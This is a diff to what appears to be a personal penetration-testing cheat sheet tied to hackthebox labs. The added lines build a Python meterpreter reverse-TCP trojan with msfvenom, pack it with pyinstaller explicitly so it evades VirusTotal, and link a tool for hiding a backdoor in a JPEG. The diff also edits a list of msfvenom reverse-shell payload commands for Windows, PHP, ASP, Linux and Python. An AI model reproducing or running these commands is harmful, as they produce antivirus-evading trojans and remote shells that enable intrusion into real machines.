@@ -4346,6 +4346,26 @@ or on machines provided by hackthebox. They are designed to be fun to hack while
     > ls -tatlh putty-fake.exe
     -rw-r--r-- 1 kali kali 1.4M Jul  1 13:37 putty-fake.exe
 
+    > sudo msfvenom -p python/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=1234 -f RAW > trojan.py
+
+    That trojan.py is detectable by virustotal, but if i use pyinstaller...
+
+    > sudo pyinstaller —one-file trojan.py
+
+    It will generate a folder named dist with the trojan. Undetectable by VirusTotal.
+
+    > pwd
+    /home/kali/test-trojan
+    > ls
+    build  dist  —one-file.spec  trojan.py  trojan.spec
+    > ls -ltah dist
+    total 6.4M
+    drwxr-xr-x 2 root root 4.0K Sep  8 12:51 .
+    -rwxr-xr-x 1 root root 6.4M Sep  8 12:51 trojan
+    drwxr-xr-x 4 kali kali 4.0K Sep  8 12:51 ..
+
+    ⭐  ~/test-trojan  ok  at 13:01:44 >
+
     3) pesidious -> weird, now i cannot run it...  https://github.com/CyberForce/Pesidious/issues/8
 
     https://kalilinuxtutorials.com/pesidious/
@@ -4375,6 +4395,10 @@ or on machines provided by hackthebox. They are designed to be fun to hack while
     https://www.dragonjar.org/manual-de-armitage-en-espanol.xhtml
     
     https://www.kali.org/tools/armitage/
+
+# How to hide a backdoor in a jpeg file
+
+    https://github.com/r00t-3xp10it/FakeImageExploiter
 
 # Exploitation and hacking of websites -> You have to see this again.
 
@@ -5092,19 +5116,19 @@ Gets a hash value
 
 # MSF Payloads
 
-    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> X > system.exe
-    msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 R > exploit.php
-    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -a x86 –platform win -f asp -o file.asp
-    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e x86/shikata_ga_nai -b “\x00” -a x86 –platform win -f c
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local IP Address> X > system.exe
+    msfvenom -p php/meterpreter/reverse_tcp LHOST=<local IP Address> LPORT=<local port> R > exploit.php
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local IP Address> LPORT=<local port> -e -a x86 –platform win -f asp -o file.asp
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local IP Address> LPORT=<local port> -e x86/shikata_ga_nai -b “\x00” -a x86 –platform win -f c
 
 # MSF generates the Meterpreter Shell that bounces under Linux
-    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -f elf -a x86 –platform linux -o shell
+    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=<local port> -e -f elf -a x86 –platform linux -o shell
 
 # MSF build bounce Shell (C Shellcode)
-    msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b “\x00\x0a\x0d” -a x86 –platform win -f c
+    msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=<local port> -b “\x00\x0a\x0d” -a x86 –platform win -f c
 
 # MSF generates a bounce Python Shell
-    msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py
+    msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=<local port> -o shell.py
 
 # MSF builds rebound ASP Shell
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp -a x86 –platform win -o shell.asp
@@ -5123,14 +5147,11 @@ Gets a hash value
 # Linux commonly used security commands
 
     find / -uid 0 -perm -4000
-
     find / -perm -o=w
-
     find / -name ” ” -print
     find / -name “..” -print
     find / -name “. ” -print
     find / -name ” ” -print
-
     find / -nouser
 
     lsof +L1
